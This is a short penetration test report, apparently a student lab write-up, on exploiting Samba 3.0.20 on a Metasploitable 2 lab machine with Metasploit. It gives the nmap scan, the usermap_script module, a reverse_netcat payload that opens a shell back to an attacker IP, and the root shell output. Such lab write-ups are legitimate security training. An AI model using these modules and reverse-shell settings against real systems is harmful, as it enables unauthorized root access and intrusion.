## 🛡️ Penetration Test Report — Samba Exploitation (Metasploitable)
📄 Overview
This penetration test was conducted against a target machine running an outdated version of Samba, hosted on the local network. The goal was to identify vulnerabilities, attempt exploitation using Metasploit Framework, and gain shell access.
## 🧠 Target Information
| Item                 | Value            |
| -------------------- | ---------------- |
| **Target IP**        | `192.168.1.184`  |
| **Attacker IP**      | `192.168.1.182`  |
| **Operating System** | Metasploitable 2 |
| **Samba Version**    | `3.0.20-Debian`  |
## 🧪 Enumeration Phase
## 🔍 Service Detection
We scanned the target and discovered an open SMB port.

* nmap -sV -p 139,445 192.168.1.184

Result:
* Samba 3.0.20 was detected on port 139 — known to be vulnerable to multiple exploits.

![Nmap](file:///C:/Users/moham/OneDrive/Pictures/Screenshots/Screenshot%20(197).png)
## 💥 Exploitation Phase
## ⚙️ Initial Exploit Attempt (Failed)
* Module used:

exploit/linux/samba/trans2open

* Payload:

cmd/unix/reverse_netcat

* Result: ❌

Exploit failed: cmd/unix/reverse_netcat is not a compatible payload.

![Netcat](file:///C:/Users/moham/OneDrive/Pictures/Screenshots/Screenshot%20(198).png)

## ⚙️ Successful Exploitation 🎯
* Module used:


exploit/multi/samba/usermap_script

* Payload:


cmd/unix/reverse_netcat

Initial LPORT 4444 failed due to port conflict.

![Port4444](file:///C:/Users/moham/OneDrive/Pictures/Screenshots/Screenshot%20(199).png)

* Changed to:

set LPORT 5555
* Result: ✅

Command shell session 1 opened.

![5555Port](file:///C:/Users/moham/OneDrive/Pictures/Screenshots/Screenshot%20(200).png)

## 🖥️ Post-Exploitation
## 🔐 Shell Access Verified
* Executed:

whoami
id
uname -a
* Result:

root
uid=0(root) gid=0(root)

Linux metasploitable 2.6.24-16-server

![RootTheKing](file:///C:/Users/moham/OneDrive/Pictures/Screenshots/Screenshot%20(201).png)

## 📝 Conclusion
* ✅ Success: Root shell access was achieved via the usermap_script Samba exploit.
* ❌ Failures: trans2open exploit failed due to incompatible payload or incorrect target match.

## 📎 Notes
* Metasploitable is a known vulnerable machine and used for legal testing.

* Be sure to stop listeners after your session or change ports to avoid conflicts.

* Always validate your target's version and exploit compatibility.

Reported By: M𓄂𓆃M

